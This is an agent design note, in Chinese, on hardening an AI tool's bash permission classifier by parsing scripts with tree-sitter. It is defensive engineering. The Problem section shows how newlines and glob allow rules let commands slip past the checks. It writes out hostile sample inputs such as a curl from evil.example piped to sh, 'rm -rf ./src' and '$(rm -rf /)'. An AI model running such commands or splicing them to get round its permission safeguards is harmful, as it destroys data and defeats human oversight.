# Agent Note: bash 权限按解析树判定（移植上游 #654）

Status: implemented

## Problem

Sati 的 bash 分类器只对「第一条命令」做 argv 判定，且 allow 规则把整个脚本当成一个字符串匹配：

- `src/tool/builtin/bash/permissions.ts` 的分词器把换行当普通空白（旧 `:314`），分隔符集合不含
  `\n`（旧 `:319`）。`"ls\nrm -rf ./src"` 因此被判为只读，直接 `passthrough`；`cat README.md\r\ncurl …`
  同理。该结论还经 `isReadOnlyShellCommand` 扩散到 ask 模式约束、plan 模式 preflight 与
  `execute_code` 的只读准入。
- `src/permission/policy/matchPermissionRule.ts` 把 `*` 翻成 `.*`，`.*` 会跨过 `&&` / `;` / `|`。
  用户规则 `Bash(git *)` 对 `git status && curl https://evil.example/x.sh | sh` 命中，等于把任意
  后续命令一起授权。

修前实测：

```text
"ls\nrm -rf ./src"                     readonly=true   verdict=passthrough
"cat README.md\r\ncurl https://…"      readonly=true   verdict=passthrough
allow "git *" vs "git status && curl … | sh"          => true
```

## Decision

移植上游 #654（`v2026.10.17` 的最终态；#637 是同日初版，被其覆盖）：

- 新增 `src/tool/builtin/bash/parser.ts`，用 `tree-sitter-bash` 的 WASM 语法解析脚本；模块导入即
  预加载，`ToolRuntime.execute()` 在 preflight 前 `await preloadBashParser()`。
- 只读判定改为遍历解析树：只接受只读语法子集、字面量 argv、只读重定向（`<` / `2>&1` /
  `/dev/null`）；出现赋值、控制流、命令/进程替换、后台 `&`、解析错误或续行符一律不判只读。
- 危险命令模式对「整串 + 每条简单命令」都匹配，换行/子 shell/命令替换不能再把命令移出锚点。
- bash allow 规则要求**覆盖脚本里的每一条**简单命令（含独立重定向与 only-redirect 替换）；
  ask/deny 则任一命令命中即可。解析器不可用时 allow 一律不命中（退回 ask），不会误放行。

Sati 独有的 `text:` 关键词规则、文件写入的真实落点（软链）校验保持原样，只替换 bash 分支。

## Alternatives considered

- **只扩展分词器把 `\n` 当分隔符** —— 仍无法覆盖子 shell、命令替换、heredoc 与重定向；
  `$(rm -rf /)`、`cat <<EOF` 等形态继续逃逸，是补一个洞留三个洞。
- **用正则切分命令** —— shell 引号、转义、heredoc 的组合使正则切分无法可靠；上游选择语法树
  正是为了避免在权限判定里维护一个半成品 shell 解析器。
- **只修 allow 跨命令匹配，不动只读判定** —— 只读侧是同一缺陷的另一个出口，且影响 ask/plan
  模式与 `execute_code`；只修一半会留下 `ls\nrm -rf ./src` 的 passthrough。
- **使用 `tree-sitter` 原生 binding** —— 需要按平台分发原生二进制并处理 ABI/签名；WASM 由
  `web-tree-sitter` 纯 JS 加载，跨平台一致，仓库已有 Electron 打包链可携带。

## Consequences

- **换来**：换行、子 shell、命令替换、重定向与续行符不再能绕过只读判定或 allow 规则。判据为
  `tests/tool/builtin/bash-permissions.spec.ts` 与 `tests/permission/bash-rule-matching.spec.ts`
  （含 Sati 回归用例）。负控制：把 allow 分支退回整串匹配 → 5 条 allow 用例转红；把只读候选
  截成首条命令 → 换行相关 3 条（含 Sati 回归）转红，恢复后全绿。
- **付出**：新增固定版本依赖 `tree-sitter-bash@0.25.0`、`web-tree-sitter@0.25.10`，每个进程多加载
  两个 WASM（约百 KB 级）；首次权限判定多一次预加载等待（之后复用）。
- **打包面**：WASM 经 `require.resolve` 从包内解析；开发态与 `dist` 直跑已验证。桌面安装包
  （`sati-main-bundle.tar` 携带 `node_modules`）本轮未实机验证——若漏包，受影响的是桌面端：
  所有 shell 命令会退化为逐次询问（fail-safe，不会放行），且 `[sati]` 日志会明确报语法加载失败。
  下一次桌面构建需在安装包里跑一次 `bash` 只读命令确认。
- **未触发重放重录**：未改任何工具 `inputSchema`；llm-replay 请求键不含权限判定。
